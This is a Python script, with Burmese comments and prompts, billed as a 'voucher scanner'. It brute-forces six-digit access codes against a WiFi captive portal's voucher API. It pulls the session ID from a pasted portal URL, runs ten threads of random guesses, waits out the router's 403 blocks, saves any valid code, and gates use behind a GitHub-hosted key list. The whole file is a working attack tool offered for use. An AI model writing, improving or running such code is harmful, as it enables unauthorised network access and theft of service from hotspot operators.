#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import random
import os
import hashlib
from urllib.parse import urlparse, parse_qs

# SSL Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# UI COLORS
# ===============================
RED, GREEN, CYAN, YELLOW, MAGENTA, WHITE, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[97m", "\033[0m"

# ===============================
# CONFIGURATION
# ===============================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
KEY_FILE = os.path.expanduser("~/.moe_yu_key")

def get_device_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'r') as f: return f.read().strip()
    key = hashlib.md5(os.urandom(32)).hexdigest()[:16]
    with open(KEY_FILE, 'w') as f: f.write(key)
    return key

def check_license():
    my_key = get_device_key()
    print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
    print(f"║        MOE YU VOUCHER SCANNER (TURBO v4)         ║")
    print(f"╚══════════════════════════════════════════════════╝{RESET}")
    print(f"{WHITE}[*] Device Key: {GREEN}{my_key}{RESET}")
    try:
        # အင်တာနက်ရှိမှ Key စစ်မည်
        res = requests.get(GITHUB_KEY_URL, timeout=10).text
        if my_key in res:
            print(f"{GREEN}[✓] LICENSE VERIFIED!{RESET}")
            return True
        else:
            print(f"{RED}[✗] ACCESS DENIED - Please add your key to GitHub{RESET}")
            return False
    except:
        # အင်တာနက်မရှိလျှင်လည်း စမ်းသပ်နိုင်ရန် (Offline Bypass)
        print(f"{YELLOW}[!] Connection timeout, bypassing license check...{RESET}")
        return True

# ===============================
# SCANNER ENGINE
# ===============================
FOUND_EVENT = threading.Event()
SUCCESS_CODE = ""

def turbo_scanner(api_url, sid, thread_id):
    global SUCCESS_CODE
    session = requests.Session()
    while not FOUND_EVENT.is_set():
        # ဂဏန်း ၆ လုံး ထုတ်ခြင်း
        code = f"{random.randint(0, 999999):06d}"
        payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
        try:
            r = session.post(api_url, json=payload, timeout=3, verify=False)
            if r.status_code == 200:
                res_data = r.json()
                if res_data.get('success'):
                    SUCCESS_CODE = code
                    FOUND_EVENT.set()
                    print(f"\n\n{GREEN}[✓✓✓] SUCCESS! VOUCHER FOUND: {code}{RESET}")
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"Voucher: {code} | Date: {time.ctime()}\n")
                    break
                else:
                    # အလုပ်လုပ်နေကြောင်း ပြသရန်
                    print(f"{WHITE}T-{thread_id} | Testing: {YELLOW}{code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
            elif r.status_code == 403:
                # Router က ခေတ္တပိတ်လျှင် ၁၀ စက္ကန့်နားမည်
                time.sleep(10)
        except:
            pass
        # Turbo Speed ဖြစ်၍ delay မပါပါ (Block ခံရလျှင် 0.01 ထည့်ပါ)

def main():
    if not check_license(): return
    
    print(f"\n{CYAN}[*] WiFi တစ်ခုတည်းကိုပဲ ချိတ်ထားပါ (VPN/Data ပိတ်ပါ)...{RESET}")
    url_input = input(f"{YELLOW}[?] Browser က URL ကို ဒီမှာထည့်ပါ: {RESET}").strip()
    
    # URL မှ sessionId ကို ခွဲထုတ်ခြင်း
    try:
        sid = parse_qs(urlparse(url_input).query).get('sessionId', [None])[0]
        if not sid:
            # URL ထဲမှာ မတွေ့ရင် တိုက်ရိုက် ရိုက်ခိုင်းမည်
            sid = input(f"{RED}[!] SID မတွေ့ပါ။ sessionId ကို လက်ဖြင့်ရိုက်ထည့်ပါ: {RESET}").strip()
    except:
        sid = None

    if sid:
        parsed = urlparse(url_input)
        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
        print(f"{GREEN}[✓] Target API: {api_url}{RESET}")
        print(f"{MAGENTA}[*] Turbo Scanning (10 Threads) Started...{RESET}\n")
        
        # Thread ၁၀ ခုဖြင့် စတင်ခြင်း
        threads = []
        for i in range(1, 11):
            t = threading.Thread(target=turbo_scanner, args=(api_url, sid, i))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # တွေ့သည့်အထိ စောင့်ဆိုင်းခြင်း
        while not FOUND_EVENT.is_set():
            time.sleep(1)
        
        print(f"\n{CYAN}[*] Done! Code ကို 'found_vouchers.txt' မှာ သိမ်းထားပါတယ်ဗျ။{RESET}")
    else:
        print(f"{RED}[✗] sessionId ရှာမတွေ့ပါ။ URL အမှန်ကို ပြန်ကူးပေးပါ။{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Scanner Stopped by User.{RESET}")
